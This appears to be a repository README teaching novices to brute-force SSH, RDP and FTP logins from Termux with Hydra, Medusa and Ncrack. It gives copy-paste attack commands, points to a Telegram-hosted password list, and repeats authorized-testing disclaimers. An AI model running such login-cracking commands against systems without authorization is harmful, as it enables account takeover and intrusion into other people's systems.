# Termux-Bruteforce
[How to Bruteforce a Network Services such as SSH, HTTP, FTP, Telnet, IMAP, SMB]


PASSWORD.TXT file can be found in Telegram Channel with link 👇👇
https://t.me/VPNConFiles/1330

As a Novice, I cannot promote or suggest any illegal or unethical activities that may harm any individual or organization. It is important to use technology, tools, and information only for ethical and lawful purposes, in compliance with local and international laws and regulations. It is recommended to use tools like Bruteforce only for authorized and legitimate purposes, such as testing the security of your own systems or with written permission from the systems owners. Using such tools for any illegal or unethical purposes without proper authorization can result in severe legal penalties and consequences.






If you have the appropriate authorization to perform a bruteforce attack on a system, then you can use the following tools on Termux:

1. Hydra: It is a fast and flexible login cracker which supports various protocols, including HTTP, FTP, Telnet, IMAP, etc.


2. Medusa: It is a command-line tool that runs on Linux, macOS, and Termux. It is designed to test the security of password-protected services, such as FTP, SSH, IMAP, etc.


3. Ncrack: It is a high-speed network authentication cracking tool which can be used to test the security of network services, such as SSH, HTTP, SMB, etc.


However, please note that bruteforcing any system without proper authorization is illegal and unethical and can result in severe legal penalties and consequences. Ensure that you have written permission from the systems owners to test the security.



Here are some examples of using Ncrack on Termux:

1. Ncrack with SSH:
To perform a bruteforce attack on an SSH server with Ncrack, use the following command:

```
ncrack -v -p 22 --user <username> -P <passwords_file> <target_ip>
```

For example, to attack an SSH server with IP address 192.168.1.100 and username root, with a password list in the file passwords.txt, use the following command:

```
ncrack -v -p 22 --user root -P passwords.txt 192.168.1.100
```

2. Ncrack with RDP:
To perform a bruteforce attack on an RDP server with Ncrack, use the following command:

```
ncrack -v -p 3389 --user <username> -P <passwords_file> <target_ip>
```

For example, to attack an RDP server with IP address 192.168.1.100 and username administrator, with a password list in the file passwords.txt, use the following command:

```
ncrack -v -p 3389 --user administrator -P passwords.txt 192.168.1.100
```

Note that these commands are for authorized testing purposes only. Using them for any unauthorized activity is illegal and unethical.







Here are some examples of using Hydra on Termux:

1. Hydra with SSH:
To perform a bruteforce attack on an SSH server with Hydra, use the following command:

```
hydra -l <username> -P <passwords_file> ssh://<target_ip>
```

For example, to attack an SSH server with IP address 192.168.1.100 and username root, with a password list in the file passwords.txt, use the following command:

```
hydra -l root -P passwords.txt ssh://192.168.1.100
```

2. Hydra with FTP:
To perform a bruteforce attack on an FTP server with Hydra, use the following command:

```
hydra -l <username> -P <passwords_file> ftp://<target_ip>
```

For example, to attack an FTP server with IP address 192.168.1.100 and username admin, with a password list in the file passwords.txt, use the following command:

```
hydra -l admin -P passwords.txt ftp://192.168.1.100
```

Note that these commands are for authorized testing purposes only. Using them for any unauthorized activity is illegal and unethical.









Here are some examples of using Medusa on Termux:

1. Medusa with SSH:
To perform a brute-force attack on an SSH server with Medusa, use the following command:

```
medusa -u <username> -P <passwords_file> -h <target_ip> -M ssh
```

For example, to attack an SSH server with IP address 192.168.1.100 and username root, with a password list in the file passwords.txt, use the following command:

```
medusa -u root -P passwords.txt -h 192.168.1.100 -M ssh
```

2. Medusa with FTP:
To perform a brute-force attack on an FTP server with Medusa, use the following command:

```
medusa -u <username> -P <passwords_file> -h <target_ip> -M ftp
```

For example, to attack an FTP server with IP address 192.168.1.100 and username admin, with a password list in the file passwords.txt, use the following command:

```
medusa -u admin -P passwords.txt -h 192.168.1.100 -M ftp
```

Note that these commands are for authorized testing purposes only. Using them for any unauthorized activity is illegal and unethical.
